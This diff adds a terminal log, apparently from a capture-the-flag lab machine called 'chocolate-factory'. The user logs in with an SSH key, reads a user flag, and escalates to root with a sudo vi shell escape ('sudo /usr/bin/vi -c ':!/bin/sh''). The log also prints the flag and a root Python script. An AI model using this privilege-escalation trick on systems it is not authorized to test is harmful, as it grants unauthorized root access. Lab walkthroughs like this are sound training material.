@@ -1,0 +1,126 @@
+root@kali:~/Scaricati# ssh charlie@chocolate-factory -i id_rsa 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-115-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Jan 27 23:20:17 UTC 2022
+
+  System load:  0.0               Processes:           597
+  Usage of /:   43.7% of 8.79GB   Users logged in:     0
+  Memory usage: 65%               IP address for eth0: 10.10.211.25
+  Swap usage:   0%
+
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Wed Oct  7 16:10:44 2020 from 10.0.2.5
+Could not chdir to home directory /home/charley: No such file or directory
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+charlie@chocolate-factory:/$ 
+charlie@chocolate-factory:/$ 
+charlie@chocolate-factory:/$ 
+charlie@chocolate-factory:/$ ls
+bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  swap.img  tmp  var      vmlinuz.old
+boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   sys       usr  vmlinuz
+charlie@chocolate-factory:/$ ll
+ll: command not found
+charlie@chocolate-factory:/$ ls -la
+total 1880168
+drwxr-xr-x  24 root root       4096 Sep  1  2020 .
+drwxr-xr-x  24 root root       4096 Sep  1  2020 ..
+drwxr-xr-x   2 root root       4096 Aug  6  2020 bin
+drwxr-xr-x   4 root root       4096 Sep  1  2020 boot
+drwxr-xr-x   2 root root       4096 Sep  1  2020 cdrom
+drwxr-xr-x  18 root root       3760 Jan 27 22:42 dev
+drwxr-xr-x  98 root root       4096 Oct  7  2020 etc
+drwxr-xr-x   3 root root       4096 Oct  1  2020 home
+lrwxrwxrwx   1 root root         34 Sep  1  2020 initrd.img -> boot/initrd.img-4.15.0-115-generic
+lrwxrwxrwx   1 root root         34 Sep  1  2020 initrd.img.old -> boot/initrd.img-4.15.0-115-generic
+drwxr-xr-x  22 root root       4096 Oct  1  2020 lib
+drwxr-xr-x   2 root root       4096 Aug  6  2020 lib64
+drwx------   2 root root      16384 Sep  1  2020 lost+found
+drwxr-xr-x   2 root root       4096 Aug  6  2020 media
+drwxr-xr-x   2 root root       4096 Aug  6  2020 mnt
+drwxr-xr-x   2 root root       4096 Aug  6  2020 opt
+dr-xr-xr-x 610 root root          0 Jan 27 22:42 proc
+drwx------   6 root root       4096 Oct  7  2020 root
+drwxr-xr-x  27 root root        900 Jan 27 23:20 run
+drwxr-xr-x   2 root root      12288 Sep  1  2020 sbin
+drwxr-xr-x   2 root root       4096 Sep  1  2020 snap
+drwxr-xr-x   3 root root       4096 Sep  1  2020 srv
+-rw-------   1 root root 1925185536 Sep  1  2020 swap.img
+dr-xr-xr-x  13 root root          0 Jan 27 22:42 sys
+drwxrwxrwt  10 root root       4096 Jan 27 23:20 tmp
+drwxr-xr-x  10 root root       4096 Aug  6  2020 usr
+drwxr-xr-x  15 root root       4096 Sep 29  2020 var
+lrwxrwxrwx   1 root root         31 Sep  1  2020 vmlinuz -> boot/vmlinuz-4.15.0-115-generic
+lrwxrwxrwx   1 root root         31 Sep  1  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-115-generic
+charlie@chocolate-factory:/$ 
+charlie@chocolate-factory:/$ 
+charlie@chocolate-factory:/$ cd home/charlie/
+charlie@chocolate-factory:/home/charlie$ ls -la
+total 40
+drwxr-xr-x 5 charlie charley 4096 Oct  7  2020 .
+drwxr-xr-x 3 root    root    4096 Oct  1  2020 ..
+-rw-r--r-- 1 charlie charley 3771 Apr  4  2018 .bashrc
+drwx------ 2 charlie charley 4096 Sep  1  2020 .cache
+drwx------ 3 charlie charley 4096 Sep  1  2020 .gnupg
+drwxrwxr-x 3 charlie charley 4096 Sep 29  2020 .local
+-rw-r--r-- 1 charlie charley  807 Apr  4  2018 .profile
+-rw-r--r-- 1 charlie charley 1675 Oct  6  2020 teleport
+-rw-r--r-- 1 charlie charley  407 Oct  6  2020 teleport.pub
+-rw-r----- 1 charlie charley   39 Oct  6  2020 user.txt
+charlie@chocolate-factory:/home/charlie$ 
+charlie@chocolate-factory:/home/charlie$ cat user.txt 
+flag{cd5509042371b34e4826e4838b522d2e}
+charlie@chocolate-factory:/home/charlie$ 
+charlie@chocolate-factory:/home/charlie$ 
+charlie@chocolate-factory:/home/charlie$ 
+charlie@chocolate-factory:/home/charlie$ sudo -l
+Matching Defaults entries for charlie on chocolate-factory:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User charlie may run the following commands on chocolate-factory:
+    (ALL : !root) NOPASSWD: /usr/bin/vi
+charlie@chocolate-factory:/home/charlie$ sudo /usr/bin/vi -c ':!/bin/sh' /dev/null
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls
+root.py
+# cat root.py
+from cryptography.fernet import Fernet
+import pyfiglet
+key=input("Enter the key:  ")
+f=Fernet(key)
+encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
+dcrypt_mess=f.decrypt(encrypted_mess)
+mess=dcrypt_mess.decode()
+display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
+display2=pyfiglet.figlet_format("Chocolate Factory ")
+print(display1)
+print(display2)
+print(mess)# 
